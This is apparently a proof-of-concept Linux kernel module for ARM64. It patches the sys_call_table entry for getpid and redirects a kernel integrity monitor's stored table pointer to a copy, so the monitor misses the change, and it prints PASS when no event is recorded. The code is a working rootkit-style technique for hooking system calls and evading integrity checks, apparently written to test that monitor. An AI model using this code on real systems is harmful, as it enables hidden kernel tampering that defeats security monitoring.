// SPDX-License-Identifier: GPL-2.0-only
/*
 * Copyright (C) 2026 dere3046
 */

#define POC_NAME "poc_systbl_redirect"
#define POC_DESC "inte poc redirect syscall table pointer"

#include "poc_common.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("dere3046");
MODULE_DESCRIPTION(POC_DESC);
#include <asm/unistd.h>

static int __init poc_init(void)
{
	const unsigned int length = __NR_syscalls * sizeof(unsigned long);
	unsigned long *table;
	unsigned long *copy;
	unsigned long **slot;
	unsigned long saved_entry;
	unsigned long *saved_pointer;
	unsigned long symbol;
	int before;
	int after;
	int ret;

	ret = poc_init_common();
	if (ret)
		return ret;
	if (!poc_syscall_table || !poc_check_task || !poc_syscall_table_event_count)
		return -EINVAL;

	table = (unsigned long *)poc_resolve("sys_call_table");
	symbol = poc_resolve("__arm64_sys_getppid");
	if (!table || !symbol)
		return -ENODATA;

	copy = kzalloc(length, GFP_KERNEL);
	if (!copy)
		return -ENOMEM;
	memcpy(copy, table, length);

	slot = (unsigned long **)poc_syscall_table;
	saved_pointer = READ_ONCE(*slot);
	saved_entry = READ_ONCE(table[__NR_getpid]);

	ret = poc_patch_word((void *)&table[__NR_getpid], symbol);
	if (ret) {
		poc_err("table patch failed %d", ret);
		kfree(copy);
		return ret;
	}

	before = READ_ONCE(*(int *)poc_syscall_table_event_count);
	poc_call_check_task((void *)poc_check_task);
	after = READ_ONCE(*(int *)poc_syscall_table_event_count);
	poc_info("patched table event %d -> %d", before, after);

	WRITE_ONCE(*slot, copy);
	before = READ_ONCE(*(int *)poc_syscall_table_event_count);
	poc_call_check_task((void *)poc_check_task);
	after = READ_ONCE(*(int *)poc_syscall_table_event_count);
	poc_info("redirected table event %d -> %d", before, after);
	poc_info("%s", after == before ? "PASS" : "FAIL");

	WRITE_ONCE(*slot, saved_pointer);
	poc_patch_word((void *)&table[__NR_getpid], saved_entry);
	kfree(copy);
	return 0;
}

static void __exit poc_exit(void)
{
	poc_exit_common();
}

module_init(poc_init);
module_exit(poc_exit);
